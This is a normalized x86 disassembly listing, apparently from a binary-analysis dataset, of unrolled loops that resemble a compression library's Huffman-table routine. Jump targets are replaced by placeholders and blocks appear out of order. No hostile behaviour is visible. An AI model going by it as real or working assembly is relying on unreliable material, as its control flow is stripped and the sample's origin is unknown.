movzx edi [ ebx + edi * 2 + 0x34 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x36 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x38 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x3a ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x3c ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x3e ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x40 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x42 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x44 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x46 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x48 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x4a ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x4c ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x4e ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x50 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x52 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x54 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x56 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x58 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x5a ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x5c ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x5e ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x60 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0xc ]
movzx edi [ ebx + edi * 2 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov [ ebp - 0x18 ] ax
shr eax 0x10
mov [ ebp - 0x14 ] cx
shr ecx 0x10
mov [ ebp - 0x10 ] dx
shr edx 0x10
mov [ ebp - 0x16 ] ax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x12 ] cx
mov [ ebp - 0xe ] dx
jmp r-xdata
inc eax
cmp eax [ ebp - 0x3c ]
jl r-xdata
push 0xbbb
jmp r-xdata
cmp ecx 0x4652
jg r-xdata
call sub_100143a7
and [ ebp - 0x20 ] 0x0
cmp [ ebp - 0x30 ] 0x0
movzx ecx [ ebx + ecx * 2 ]
jle r-xdata
and [ ebp - 0x20 ] 0x0
or ecx 0xffffffff
cmp [ ebp - 0x30 ] 0x0
mov [ ebp - 0x24 ] 0x3b9ac9ff
jle r-xdata
xor eax eax
cmp [ ebp - 0x30 ] eax
jle r-xdata
mov ecx [ ebp - 0x24 ]
inc ecx
cmp ecx [ ebp - 0x2c ]
movzx ecx cx
lea ecx [ ecx + esi + 0x9324 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x28 ] edx
inc [ ebp + ecx * 4 - 0x5c ]
mov edx [ ebp - 0x40 ]
inc [ ebp - 0x40 ]
cmp [ ebp - 0x30 ] 0x6
mov [ esi + edx + 0x680 ] cl
jne r-xdata
mov edx [ ebp - 0x20 ]
movzx edx [ ebp + edx * 2 - 0x18 ]
cmp edx [ ebp - 0x24 ]
jge r-xdata
test ecx ecx
jle r-xdata
mov [ ebp + eax - 0xc ] al
inc eax
cmp eax [ ebp - 0x30 ]
jl r-xdata
mov edx [ ebp - 0x20 ]
movzx di [ ecx ]
lea edx [ ebp + edx * 2 - 0x18 ]
add [ edx ] di
inc [ ebp - 0x20 ]
mov edx [ ebp - 0x20 ]
add ecx 0x102
cmp edx [ ebp - 0x30 ]
jl r-xdata
cmp eax [ ebp - 0x2c ]
jg r-xdata
mov edx [ ebp - 0x2c ]
sub edx eax
inc edx
cmp edx 0x32
jne r-xdata
inc [ ebp - 0x20 ]
mov edx [ ebp - 0x20 ]
cmp edx [ ebp - 0x30 ]
jl r-xdata
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x24 ] edx
and [ ebp - 0x20 ] 0x0
cmp [ ebp - 0x30 ] 0x0
jle r-xdata
lea edi [ esi + 0x4cd2 ]
mov [ ebp - 0x28 ] ecx
mov eax [ ebp - 0x2c ]
mov ecx [ esi + 0x274 ]
inc eax
cmp eax ecx
mov [ ebp - 0x24 ] eax
jl r-xdata
add ecx 0x2c
imul ecx ecx 0x102
movzx edx [ ebx + eax * 2 ]
add ecx 0x2c
imul ecx ecx 0x102
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x2 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x4 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x6 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x8 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0xa ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0xc ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0xe ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x10 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x12 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x14 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x16 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x18 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x1a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x1c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x1e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x20 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x22 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x24 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x26 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x28 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x2a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x2c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x2e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x30 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x32 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x34 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x36 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x38 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x3a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x3c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x3e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x40 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x42 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x44 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x46 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x48 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x4a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x4c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x4e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x50 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x52 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x54 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x56 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x58 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x5a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x5c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x5e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx eax [ ebx + eax * 2 + 0x60 ]
add eax ecx
lea eax [ esi + eax * 4 ]
inc [ eax ]
mov eax [ ebp - 0xc ]
movzx eax [ ebx + eax * 2 ]
add eax ecx
lea eax [ esi + eax * 4 ]
inc [ eax ]
jmp r-xdata
lea eax [ esi + 0x58 ]
xor ecx ecx
mov edi eax
lea eax [ esi + 0x9324 ]
mov [ ebp - 0x28 ] 0xffff9328
sub [ ebp - 0x28 ] esi
mov [ ebp - 0x2c ] eax
mov al [ ebp - 0x35 ]
mov [ edi ] cl
inc edi
dec [ ebp - 0x28 ]
mov [ ebp - 0xc ] al
jne r-xdata
mov al [ ebp - 0x35 ]
inc ecx
mov [ ebp - 0x41 ] al
lea eax [ ebp + ecx - 0xc ]
mov dl [ eax ]
mov [ ebp - 0x35 ] dl
mov dl [ ebp - 0x41 ]
mov [ eax ] dl
mov al [ edi - 0x4652 ]
cmp al [ ebp - 0x35 ]
jne r-xdata
movzx edx [ ebx + eax * 2 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
inc eax
cmp eax [ ebp - 0x2c ]
jle r-xdata
inc edx
cmp edx 0x10
jl r-xdata
mov [ eax ] 0x1
xor ecx ecx
cmp edx [ ebp - 0x34 ]
mov [ ebp - 0x24 ] edx
jg r-xdata
mov eax [ ebp - 0x2c ]
movzx eax [ eax + ecx ]
cmp eax [ ebp - 0x34 ]
jle r-xdata
mov dl [ ebp - 0xc ]
mov al [ edi - 0x4652 ]
xor ecx ecx
mov [ ebp - 0x35 ] dl
cmp al dl
je r-xdata
cmp [ edx + edi ] 0x0
je r-xdata
inc ecx
add edi 0x10
cmp ecx 0x10
jl r-xdata
inc [ ebp - 0x20 ]
mov eax [ ebp - 0x20 ]
add [ ebp - 0x2c ] 0x102
cmp eax [ ebp - 0x30 ]
jl r-xdata
xor eax eax
cmp [ ebp - 0x3c ] eax
jle r-xdata
cmp eax edx
jge r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp + ecx - 0x1c ]
mov [ eax ] 0x0
xor edx edx
mov eax [ esi + 0x4c ]
mov [ ebp - 0x34 ] eax
xor edi edi
xor ecx ecx
cmp [ ebp - 0x3c ] ecx
push 0x20
pop edx
mov [ ebp - 0x34 ] ecx
jle r-xdata
add ecx ecx
inc [ ebp - 0x24 ]
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x34 ]
jle r-xdata
mov edx [ ebp - 0x2c ]
movzx edx [ eax + edx ]
cmp edx [ ebp - 0x24 ]
jne r-xdata
inc ecx
cmp ecx [ ebp - 0x3c ]
jl r-xdata
mov edx eax
push 0x1
inc ecx
push ecx
jmp r-xdata
inc eax
cmp eax [ ebp - 0x3c ]
jl r-xdata
mov edx [ ebp - 0x28 ]
add edx eax
add edx [ ebp - 0x2c ]
mov [ esi + edx * 4 ] ecx
inc ecx
cmp [ ebp - 0x34 ] 0x11
jg r-xdata
xor ecx ecx
mov eax esi
cmp [ ebp + edi - 0x1c ] cl
je r-xdata
and [ ebp - 0x24 ] 0x0
lea eax [ esi + 0x58 ]
mov [ ebp - 0x28 ] eax
call sub_10015822
inc edi
cmp edi 0x10
pop ecx
jl r-xdata
push 0xbbc
jmp r-xdata
cmp edx 0x1
jl r-xdata
inc [ ebp - 0x24 ]
add [ ebp - 0x28 ] 0x10
cmp [ ebp - 0x24 ] 0x10
jl r-xdata
xor edi edi
push 0xbbd
jmp r-xdata
mov eax [ ebp - 0x24 ]
cmp [ ebp + eax - 0x1c ] 0x0
je r-xdata
cmp [ esi + 0x268 ] 0x3
jl r-xdata
push 0x1
inc ecx
push ecx
jmp r-xdata
mov eax [ esi + 0x4c ]
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x34 ] eax
push 0x3
mov eax esi
call sub_10015822
mov ecx [ ebp - 0x40 ]
push 0xf
call sub_10015822
cmp [ ebp - 0x40 ] 0x0
pop ecx
pop ecx
jle r-xdata
mov eax [ esi + 0x4c ]
sub eax [ ebp - 0x34 ]
push eax
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
add esp 0xc
mov eax [ ebp - 0x28 ]
xor ecx ecx
cmp [ edi + eax ] cl
mov eax esi
je r-xdata
call sub_10015822
inc edi
cmp edi 0x10
pop ecx
jl r-xdata
cmp [ esi + 0x268 ] 0x3
jl r-xdata
mov eax [ ebp - 0x40 ]
lea edi [ esi + 0x4cd2 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x30 ]
mov eax [ esi + 0x4c ]
mov [ ebp - 0x34 ] eax
test ecx ecx
jle r-xdata
mov eax [ esi + 0x4c ]
sub eax [ ebp - 0x34 ]
push eax
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
add esp 0xc
push 0x1
xor ecx ecx
mov eax esi
call sub_10015822
inc edi
dec [ ebp - 0xc ]
pop ecx
jne r-xdata
xor ecx ecx
inc ecx
push ecx
mov eax esi
call sub_10015822
movzx eax [ edi ]
inc [ ebp - 0x28 ]
cmp [ ebp - 0x28 ] eax
pop ecx
jl r-xdata
cmp [ esi + 0x268 ] 0x3
jl r-xdata
lea eax [ esi + 0x9324 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0xc ] ecx
and [ ebp - 0x28 ] 0x0
cmp [ edi ] 0x0
jbe r-xdata
mov eax [ esi + 0x4c ]
xor ecx ecx
mov [ ebp - 0x34 ] eax
mov eax [ esi + 0x274 ]
cmp eax ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x24 ] ecx
jle r-xdata
mov eax [ esi + 0x4c ]
sub eax [ ebp - 0x34 ]
push eax
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
add esp 0xc
add [ ebp - 0x20 ] 0x102
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x3c ]
mov edi [ ebp - 0x20 ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov eax [ ebp - 0x3c ]
cmp eax [ ebp - 0x40 ]
je r-xdata
lea edx [ ecx + 0x31 ]
cmp edx eax
mov [ ebp - 0xc ] edx
mov [ ebp - 0x2c ] edx
jl r-xdata
mov eax [ ebp - 0x20 ]
movzx ecx [ eax ]
push 0x5
mov eax esi
mov [ ebp - 0x2c ] ecx
call sub_10015822
cmp [ ebp - 0x3c ] 0x0
pop ecx
jle r-xdata
movzx eax [ edi ]
cmp [ ebp - 0x2c ] eax
jl r-xdata
cmp [ esi + 0x268 ] 0x3
jl r-xdata
push 0xbbf
jmp r-xdata
mov eax [ ebp - 0x3c ]
lea edi [ eax + esi + 0x680 ]
movzx eax [ edi ]
cmp eax [ ebp - 0x30 ]
jge r-xdata
dec eax
mov [ ebp - 0x2c ] eax
push 0x2
pop ecx
push ecx
mov eax esi
call sub_10015822
inc [ ebp - 0x2c ]
pop ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
mov eax [ esi + 0x4c ]
sub eax [ ebp - 0x34 ]
push eax
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
add esp 0xc
push 0xbbe
jmp r-xdata
cmp [ ebp - 0x30 ] 0x6
jne r-xdata
movzx eax [ edi ]
cmp [ ebp - 0x2c ] eax
mov eax esi
jg r-xdata
cmp ecx [ ebp - 0x2c ]
mov [ ebp - 0x24 ] ecx
jg r-xdata
mov eax [ ebp - 0x2c ]
sub eax ecx
inc eax
cmp eax 0x32
jne r-xdata
push 0x2
push 0x3
pop ecx
call sub_10015822
dec [ ebp - 0x2c ]
pop ecx
push 0x1
xor ecx ecx
call sub_10015822
inc edi
dec [ ebp - 0x28 ]
pop ecx
jne r-xdata
mov ecx [ ebp - 0x2c ]
mov eax [ esi + 0x274 ]
inc ecx
inc [ ebp - 0x3c ]
cmp ecx eax
mov [ ebp - 0x24 ] ecx
jl r-xdata
movzx eax [ edi ]
mov ecx [ ebp - 0x24 ]
movzx ecx [ ebx + ecx * 2 ]
lea edx [ eax + 0x26 ]
add eax 0x92
imul edx edx 0x102
imul eax eax 0x102
add eax esi
movzx eax [ eax + ecx ]
add edx ecx
mov ecx [ esi + edx * 4 ]
push eax
mov eax esi
call sub_10015822
inc [ ebp - 0x24 ]
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x2c ]
pop ecx
jle r-xdata
movzx eax [ edi ]
mov ecx [ ebp - 0x24 ]
movzx ecx [ ebx + ecx * 2 ]
lea edi [ eax + 0x92 ]
add eax 0x26
imul edi edi 0x102
imul eax eax 0x408
add edi esi
movzx edx [ edi + ecx ]
add eax esi
mov ecx [ eax + ecx * 4 ]
mov [ ebp - 0x20 ] eax
push edx
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x2 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x4 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x6 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x8 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0xa ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0xc ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0xe ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x10 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x12 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x14 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x16 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x18 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x1a ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x1c ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x1e ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x20 ]
movzx ecx [ edi + eax ]
add esp 0x40
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x22 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x24 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x26 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x28 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x2a ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x2c ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
